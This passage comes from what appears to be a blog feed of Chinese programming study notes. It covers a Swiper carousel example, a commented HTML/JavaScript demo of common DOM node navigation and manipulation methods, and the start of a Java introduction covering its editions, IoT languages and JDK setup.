class="string">&quot;https://unpkg.com/swiper/swiper-bundle.min.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        *&#123;</span><br><span class="line"><span class="css">            <span class="attribute">margin</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .swiper-container&#123;</span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">800px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>:<span class="number">400px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>:<span class="number">100px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .swiper-slide&#123;</span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">800px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.swiper-slide</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">800px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-wrapper&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-slide&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/1.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-slide&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/2.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-slide&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/3.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-pagination&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/swiper/swiper-bundle.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> mySwiper = <span class="keyword">new</span> Swiper(<span class="string">&#x27;.swiper-container&#x27;</span>,&#123;</span></span><br><span class="line">                autoplay:&#123;</span><br><span class="line"><span class="javascript">                    delay:<span class="number">2000.</span><span class="comment">//1s切换一次</span></span></span><br><span class="line">                &#125;,</span><br><span class="line"><span class="javascript">                loop:<span class="literal">true</span>, <span class="comment">//循环</span></span></span><br><span class="line">                pagination:&#123;</span><br><span class="line"><span class="javascript">                    el:<span class="string">&#x27;.swiper-pagination&#x27;</span>,</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day19-DOM常见操作"><a href="#day19-DOM常见操作" class="headerlink" title="day19 DOM常见操作"></a>day19 DOM常见操作</h2><h3 id="DOM节点与导航"><a href="#DOM节点与导航" class="headerlink" title="DOM节点与导航"></a>DOM节点与导航</h3><h4 id="ChildNodes-属性，返回子节点"><a href="#ChildNodes-属性，返回子节点" class="headerlink" title="ChildNodes 属性，返回子节点"></a>ChildNodes 属性，返回子节点</h4><h4 id="firstChild，lastChild，parentNode，nextSibling，previousSibling属性"><a href="#firstChild，lastChild，parentNode，nextSibling，previousSibling属性" class="headerlink" title="firstChild，lastChild，parentNode，nextSibling，previousSibling属性"></a>firstChild，lastChild，parentNode，nextSibling，previousSibling属性</h4><h4 id="firstElementChild，lastElementChild，parentElementNode，nextElementSibling，prebiousElementSibling-筛选元素标签"><a href="#firstElementChild，lastElementChild，parentElementNode，nextElementSibling，prebiousElementSibling-筛选元素标签" class="headerlink" title="firstElementChild，lastElementChild，parentElementNode，nextElementSibling，prebiousElementSibling 筛选元素标签"></a>firstElementChild，lastElementChild，parentElementNode，nextElementSibling，prebiousElementSibling 筛选元素标签</h4><h3 id="DOM增删改查"><a href="#DOM增删改查" class="headerlink" title="DOM增删改查"></a>DOM增删改查</h3><h4 id="DOM-创建creatElement-“li”-，creatTextNode-“文本”-，innerHTML-“文本”"><a href="#DOM-创建creatElement-“li”-，creatTextNode-“文本”-，innerHTML-“文本”" class="headerlink" title="DOM 创建creatElement(“li”)，creatTextNode(“文本”)，innerHTML=“文本”"></a>DOM 创建creatElement(“li”)，creatTextNode(“文本”)，innerHTML=“文本”</h4><h4 id="DOM-添加appendChild-，insertBefore-，before-，after-，"><a href="#DOM-添加appendChild-，insertBefore-，before-，after-，" class="headerlink" title="DOM 添加appendChild()，insertBefore()，before()，after()，"></a>DOM 添加appendChild()，insertBefore()，before()，after()，</h4><h4 id="DOM-删除-remove-，removeChild"><a href="#DOM-删除-remove-，removeChild" class="headerlink" title="DOM 删除 remove()，removeChild()"></a>DOM 删除 remove()，removeChild()</h4><h4 id="DOM-替换replaceChild-方法"><a href="#DOM-替换replaceChild-方法" class="headerlink" title="DOM 替换replaceChild()方法"></a>DOM 替换replaceChild()方法</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM常见节点操作<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>5<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>添加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>添加的内容<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>h1用于替换<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//childNodes    返回一个数组，该数组由给定节点的子节点构成</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ul = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;ul&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ul.childNodes);</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 会返回空白、空格部分，text，即ul与li标签之间的回车空白等</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// firstChild  返回第一个子节点</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ul.firstChild);  <span class="comment">//注意大写C，否则返回undefined</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// lastChild</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ul.lastChild);</span></span><br><span class="line"><span class="javascript">        <span class="comment">// parentNode  返回给定节点的上级结点</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> li=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;li&quot;</span>)[<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript">        <span class="comment">//注意，这里是获取单个li，以下parentNode，nextSibling，previousSibling对单个生效，否则返回undefined</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(li.parentNode); <span class="comment">//返回ul</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//nextSibling  返回给定节点的下一个节点</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(li.nextSibling);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//previousSibling   返回给定节点上一个节点</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(li.previousSibling);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//加一个过滤效果，只筛选元素结点，不要空text节点 Element，这部分也叫导航</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ul.firstElementChild);<span class="comment">//获取ul节点下第一个元素节点</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ul.lastElementChild);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(li.previousElementSibling);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(li.nextElementSibling);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//获取后的操作</span></span></span><br><span class="line"><span class="javascript">        ul.firstElementChild.innerHTML=<span class="string">&quot;用firstElementChild获取的第一个li字标签内容&quot;</span>;</span></span><br><span class="line"><span class="javascript">        ul.lastElementChild.style.fontsize=<span class="string">&quot;30px&quot;</span>;</span></span><br><span class="line"><span class="javascript">        li.previousElementSibling.style.color=<span class="string">&quot;red&quot;</span>;</span></span><br><span class="line"><span class="javascript">        li.nextElementSibling.style.background=<span class="string">&quot;green&quot;</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//=========================================</span></span></span><br><span class="line">        </span><br><span class="line"><span class="javascript">        <span class="comment">//DOM常见操作方法: 创建，添加，删除，替换</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//a. 创建元素节点  creatElement</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> cli=<span class="built_in">document</span>.createElement(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">&quot;========下面是DOM操作===========&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(cli);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//b. 添加   </span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//应用，这个添加功能可以做类似留言板，购物车的效果</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//1. 使用appendChild()方法   在指定节点内部末尾添加一个新的子结点   eg. parent.appendChild(childNodes)</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ool=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;ol&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line">        ool.appendChild(cli);</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//添加文本节点    createTextNode(&quot;文本&quot;)</span></span></span><br><span class="line">        </span><br><span class="line"><span class="javascript">        <span class="comment">//1.1.创建文本节点，</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> txt=<span class="built_in">document</span>.createTextNode(<span class="string">&quot;document.createTextNode&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//创建元素节点，一个标签包裹就可看做是一个元素，元素创建好这个li标签就临时存在js代码中</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> cli2=<span class="built_in">document</span>.createElement(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//文本节点放到元素节点中，即用标签包裹起来</span></span></span><br><span class="line">        cli2.appendChild(txt);</span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">&quot;cli2标签：&quot;</span>+cli2);</span></span><br><span class="line">        ool.appendChild(cli2);</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// 1.2.也可用innerHTML属性在标签中添加文本</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> cli3=<span class="built_in">document</span>.createElement(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        cli3.innerHTML=<span class="string">&quot;用innerHTML添加文本&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//元素li放到上级的ol里面，标签嵌套起来</span></span></span><br><span class="line">        ool.appendChild(cli3);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//2. insertBefore(待添加节点，parent位置) 方法添加，</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> cli4=<span class="built_in">document</span>.createElement(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        cli4.innerHTML=<span class="string">&quot;使用insertBefore()方法&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> li2=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;li&quot;</span>)[<span class="number">5</span>+<span class="number">1</span>];</span></span><br><span class="line"><span class="javascript">        <span class="comment">//上面需要指定一个li，给出下标</span></span></span><br><span class="line">        ool.insertBefore(cli4,li2);</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//3. after()方法添加sibling同级元素标签</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> cli44=<span class="built_in">document</span>.createElement(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        cli44.innerHTML=<span class="string">&quot;使用after()方法在之后添加sibling同级元素标签&quot;</span></span></span><br><span class="line">        ool.after(cli44);</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//4. before()方法在之前添加同级元素</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> cli45 = <span class="built_in">document</span>.createElement(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        cli45.innerHTML = <span class="string">&quot;使用after()方法在之前添加sibling同级元素标签&quot;</span></span></span><br><span class="line">        ool.before(cli45);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//=======================================</span></span></span><br><span class="line">        </span><br><span class="line"><span class="javascript">        <span class="comment">//c. 删除节点 </span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//1. removechild()方法</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ul=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;ul&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        ul.removeChild(ul.childNodes[<span class="number">3</span>]);<span class="comment">//删除第二个结点，注意这里ul中还混有文本text结点，所以下标3其实就是数字2</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//也可以用firstElementChild直接抓到第一个元素结点，而不是文本结点，可以直接删到数字2的元素标签</span></span></span><br><span class="line">        ul.removeChild(ul.firstElementChild);</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> li2rm=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        ul.removeChild(li2rm[<span class="number">2</span>]);<span class="comment">//删除数字5，要考虑到代码执行顺序，前面已经删掉了1和2，所以这里上一行获取元素时数字5排在下标2的位置</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//2.也可以直接使用remove()方法</span></span></span><br><span class="line">        li2rm[0].remove();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//============================================</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//d. 替换节点   replaceChild(新元素，旧元素)</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> div=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;div&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> newele=<span class="built_in">document</span>.createElement(<span class="string">&quot;p&quot;</span>);</span></span><br><span class="line"><span class="javascript">        newele.innerHTML=<span class="string">&quot;这是p标签新元素&quot;</span>;</span></span><br><span class="line"><span class="javascript">        div.replaceChild(newele,div.lastElementChild);<span class="comment">//注意这里使用firstElementChild，用Element过滤出元素标签</span></span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DOM </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java模拟登录前后端交互</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Java%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Java%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/</url>
      
        <content type="html"><![CDATA[<h2 id="day1-关于java"><a href="#day1-关于java" class="headerlink" title="day1 关于java"></a>day1 关于java</h2><h3 id="java介绍"><a href="#java介绍" class="headerlink" title="java介绍"></a>java介绍</h3><p>原名叫Oak，后来改名叫java</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210606104851852.png" alt="image-20210606104851852"></p><p>现在版本有15，16，现在最主要的还是用8版本</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210606105007078.png" alt="image-20210606105007078"></p><hr><h3 id="三个版本"><a href="#三个版本" class="headerlink" title="三个版本"></a>三个版本</h3><p><strong>J2SE(Java 2 Platform Standard Edition)标准版</strong></p><p>是为开发普通桌面和商务应用程序提供的解决方案，该技术体系是其他两者的基础，可以完成一-些桌面应用（包含了基础语法等）程序的开发</p><p><strong>J2ME(Java 2 Platform Micro Edition)小型版</strong></p><p>一是为开发电子消费产品和嵌入式设备提供的解决方案（物联网用）</p><blockquote><p>关于IoT物联网编程语言</p><p>参考链接：<a href="https://baijiahao.baidu.com/s?id=1661777459541384122&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1661777459541384122&amp;wfr=spider&amp;for=pc</a></p><p>C / C ++</p><p>无论何时，当涉及到物联网设备时，C和C ++都会占据统治地位。根据IoT开发人员调查，对于受限设备，C语言排在第一位，而C ++紧随及后。这些语言以其可移植性而闻名，并且大多数IoT设备的微控制器都支持这些语言。</p><p>Go</p><p>你没有听错，是的，由科技巨头Google创建的Golang在开发物联网平台时也占据着一席之位。因为Golang具有内置的并发性和出色的性能，可最大限度地提高硬件利用率，从而使该语言非常适合IoT设备的卡法。该语言既有出色的性能，同时又有着高效的开发效率，可以说它是除了c语言之外人们最看好的物联网开发语言。</p><p>Java</p><p>java设计之初就是一种嵌入式语言，而后来的发展让它成为了web和andorid移动端的主力语言。但是java天生就是适合做硬件设备开发的。在物联网崛起的时候，java理所当然回归本行，尤其是Cinterion等框架的出现，更是让java在物联网的道路上如虎添翼，也许java又会在物联网上称霸一方。</p><p>JavaScript</p><p>如果你善于观察的话，你会发现到处多有JS的身影，从早先的web前端，到后来的手机客户端，再到后来的服务器端，JS正在一步步占领着自己的领地。人们经常听到的一句话就是，如果一种东西可以使用JS来实现的话，最后都会用JS来实现。可以说JS已经强大到所有人都要重视它的程度了。</p><p>Lua</p><p>Lua是一种通用的嵌入式编程语言，旨在通过数据描述工具支持过程编程。它是具有功能强大的数据描述功能的可扩展过程语言，旨在用作通用扩展语言。作为一种嵌入式语言，该语言仅适用于宿主客户端。Node.lua是基于轻量级Lua解释器和libuv构建的“物联网”框架，用于类似于node.js的事件驱动（非阻塞I / O模型）</p><p>ParaSail</p><p>ParaSail是一种新的并行编程语言，旨在支持固有安全性，高度并行的应用程序的开发，这些应用程序可以映射到多核，异构或分布式体系结构。该语言包括高级规范功能，包括参数化的模块以及将接口与实现完全分离的参数，模块内单个操作的前提条件和条件，适用于模块内所有操作的不变式等等.</p><p>Python</p><p>作为胶水语言，到处都有python的身影。Python是开发人员社区中最受欢迎的语言之一，python语言有着强大的类库，只要你想要的功能，社区都有现成的库供你选择，正是那句话，人生苦短，我用python，当你选择了python你就会发现，原来一切变得如此容易，物联网开发也仅仅就是调用几个库就可以优雅地实现。</p><p>PHPoC</p><p>PHPoC（PHP on  Chip）是一种编程语言，也是一种基于广泛使用的PHP语言开发的IoT硬件平台。就在所有人都在唱衰php的时候，php另辟蹊径，在物联网上有占有了自己的一席之地。就这样PHP现在不仅仅是Web开发语言，而且也是用于IoT的通用编程语言。PHPoC语法与PHP几乎相同，它几乎继承了PHP的所有核心功能。此外，PHPoC添加了新功能，可用于与硬件外围设备进行交互，例如I / O，UART，I2C，SPI，ADC，TIMER / COUNTER，RTC等。</p><p>Rust</p><p>Rust的出现正在企图取代C语言。由于C和C  ++具有细粒度的内存管理和较低的运行时开销，因此它们是IoT设备的通用编程语言。同样，Rust也具有低开消和内存管理功能，同时它还是一种内存安全的系统编程语言。可以说它出现的目的就是在追求性能的同时，也要注重安全，而它做到了。</p></blockquote><p><strong>J2EE(Java 2 Platform Enterprise Edition)企业版</strong></p><p>一是为开发企业环境下的应用程序提供的一套解决方案，该技术体系中包含的技术如Servlet、Jsp等， 主要针对于Web应用程序开发（90%工作，前后端交互）</p><h3 id="java特点"><a href="#java特点" class="headerlink" title="java特点"></a>java特点</h3><ul><li><p>胶水语言</p></li><li><p>跨平台（基于JVM&lt;JRE&lt;JDK）</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210606105112347.png" alt="image-20210606105112347"></p></li><li><p>面向对象（很多功能都封装在类中，jdk里面有很多，用的时候new对象）</p></li><li></li></ul><h3 id="java从编写到运行原理"><a href="#java从编写到运行原理" class="headerlink" title="java从编写到运行原理"></a>java从编写到运行原理</h3><p>JDK与JRE</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210606105152354.png" alt="image-20210606105152354"></p><hr><p>安装环境：</p><p>Oracle公司官网下载</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210606105244474.png" alt="image-20210606105244474"></p><p>环境变量的目的就是使得每次编译执行指令都不需要转到bin工具包中使用cmd来编译执行，cmd输入java测试成功</p><h4 id="helloworld"><a href="#helloworld" class="headerlink" 